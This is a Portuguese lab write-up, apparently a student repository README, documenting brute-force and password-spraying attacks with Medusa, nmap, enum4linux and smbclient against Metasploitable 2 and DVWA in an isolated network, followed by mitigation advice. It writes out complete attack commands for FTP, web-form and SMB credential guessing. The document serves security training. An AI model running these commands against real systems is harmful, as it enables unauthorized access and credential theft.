Simulação de Ataque de Força Bruta com Kali Linux e Medusa
Este repositório documenta a execução de um projeto prático de cibersegurança, focado na simulação de ataques de força bruta. Utilizamos o Kali Linux como plataforma de ataque e a ferramenta Medusa para realizar os ataques contra ambientes vulneráveis, especificamente Metasploitable 2 e DVWA.

🎯 Objetivo do Projeto
O objetivo principal é implementar, documentar e compartilhar um projeto prático para simular cenários de ataque de força bruta (FTP, Formulário Web e SMB) e, a partir disso, exercitar e propor medidas de prevenção e mitigação.

🛠️ Ambiente de Simulação
O laboratório foi configurado no VirtualBox com os seguintes componentes:

VM Atacante: Kali Linux

VM Alvo: Metasploitable 2 (que também hospeda o DVWA)

Configuração de Rede: Ambas as VMs foram configuradas em modo "Rede Interna" (ou Host-Only) no VirtualBox para garantir um ambiente isolado.

⚙️ Execução dos Testes
A seguir, detalhamos os passos executados, desde o reconhecimento até a simulação dos ataques.

1. Reconhecimento (Recon)
O primeiro passo é identificar o endereço IP da máquina alvo (Metasploitable 2) e verificar os serviços e portas disponíveis.

 1.1 Identificação do IP Alvo: Dentro da VM Metasploitable 2, o comando a seguir foi usado para encontrar seu IP:

Bash

 > ip a

No nosso teste, o IP do Metasploitable 2 foi 192.168.56.1 (substitua pelo IP do seu ambiente).

 1.2 Verificação de Conectividade: Na máquina Kali, usamos o ping para confirmar que a máquina alvo está acessível:

Bash

 > ping -c 3 192.168.56.1

 1.3 Varredura de Portas (Nmap): Utilizamos o Nmap para escanear as portas mais comuns e identificar as versões dos serviços em execução.

Bash

-sV: Detecta a versão dos serviços

-p: Define as portas específicas a serem escaneadas
 
 > nmap -sV -p 21,22,80,445,139 192.168.56.1

O resultado confirmou que as portas 21 (FTP), 80 (HTTP) e 445 (SMB) estavam abertas, tornando-as nossos alvos.

2. Ataque 1: Força Bruta em FTP (Porta 21)

O serviço FTP (File Transfer Protocol) é um alvo comum para força bruta se não estiver configurado corretamente.

2.1 Criação das Wordlists: Criamos arquivos simples de usuarios.txt e senhas.txt para o Medusa utilizar.

Bash

Cria um arquivo de possíveis usuários
> echo -e "msfadmin\nuser\nroot\nvagrant" > usuarios.txt

Cria um arquivo de possíveis senhas
> echo -e "msfadmin\npassword\n12345\nvagrant" > senhas.txt

2.2 Execução do Medusa: Usamos o Medusa para testar as combinações de usuário e senha no serviço FTP.

Bash

-h: Host (alvo)
-U: Arquivo de usuários
-P: Arquivo de senhas (Passwords)
-M: Módulo de ataque (neste caso, ftp)
-t: Número de threads (tarefas simultâneas)

> medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 6

Resultado: O Medusa identificou com sucesso as credenciais msfadmin:msfadmin como válidas.

3. Ataque 2: Força Bruta em Formulário Web (DVWA)
Muitos ataques de força bruta visam formulários de login em páginas web.

3.1 Análise do Formulário:
   Acessamos o formulário de login do DVWA (http://192.168.56.1/dvwa/login.php) e, usando as ferramentas de desenvolvedor do navegador (Aba "Network"), identificamos os parâmetros enviados (username, password, Login) e a mensagem de falha ("Login failed").

3.2 Execução do Medusa (Módulo HTTP): Configuramos o Medusa para simular o envio desse formulário, substituindo os valores de ^USER^ e ^PASS^ com nossas listas.

Bash

> medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

Resultado: O Medusa testou as combinações e encontrou as credenciais válidas para o DVWA.

4. Password Spraying em SMB (Porta 445)
O "Password Spraying" é uma variação do ataque de força bruta onde testamos um pequeno número de senhas (geralmente as mais comuns) contra uma grande lista de usuários. Isso é mais sutil e evita o bloqueio de contas.

4.1 Enumeração de Usuários (enum4linux): Primeiro, usamos o enum4linux para extrair uma lista de usuários válidos do serviço SMB (Samba) do alvo.

Bash

> -a: Ativa todas as técnicas de enumeração
> | tee: Salva a saída no terminal e em um arquivo

> enum4linux -a 192.168.56.101 | tee enum4_output.txt

Analisando o arquivo enum4_output.txt, extraímos uma lista de nomes de usuários (ex: msfadmin, vagrant, service, user).

4.2 Criação das Listas (Spray): Criamos uma lista de usuários com base no enum4linux e uma lista muito pequena de senhas comuns.

Bash

Lista de usuários extraída

> echo -e "msfadmin\nvagrant\nservice\nuser" > smb_users.txt

Lista de senhas para o "spray"

> echo -e "msfadmin\npassword\n12345" > smb_pass_spray.txt

4.3 Execução do Medusa (SMB): Executamos o Medusa com o módulo smbnt para testar as poucas senhas contra todos os usuários.

Bash

> medusa -h 192.168.56.101 -U smb_users.txt -P smb_pass_spray.txt -M smbnt -t 2 -T 50

4.4 Validação do Acesso: Após o Medusa encontrar uma credencial válida (ex: msfadmin:msfadmin), validamos o acesso usando o smbclient.

Bash

-L: Lista os compartilhamentos
-U: Especifica o usuário

> smbclient -L //192.168.56.101 -U msfadmin

Foi solicitada a senha msfadmin, e o acesso aos compartilhamentos foi concedido, confirmando o sucesso do ataque.

5. 🛡️ Recomendações de Mitigação
Com base nos ataques simulados, as seguintes medidas de prevenção são recomendadas para proteger os serviços:

Políticas de Senha Fortes: Exigir senhas complexas (combinação de letras maiúsculas, minúsculas, números e símbolos) e com comprimento mínimo.

Bloqueio de Contas (Account Lockout): Implementar uma política que bloqueie temporariamente uma conta após um número específico de tentativas de login falhas (ex: 5 tentativas).

Autenticação Multifator (MFA): Sempre que possível, habilitar o MFA. Isso adiciona uma camada extra de segurança que um ataque de força bruta não pode contornar apenas com uma senha.

Monitoramento e Alertas: Configurar logs e alertas para identificar um grande volume de tentativas de login falhas, indicando um possível ataque em andamento.

Renomear Contas Padrão: Evitar o uso de nomes de usuário óbvios ou padrão, como admin ou root, em serviços expostos.


wordlists/: Pasta contendo as listas de usuários e senhas usadas nos testes (usuarios.txt, senhas.txt, smb_users.txt, etc.).

images/: (Opcional) Capturas de tela (screenshots) dos resultados do Nmap e do Medusa.
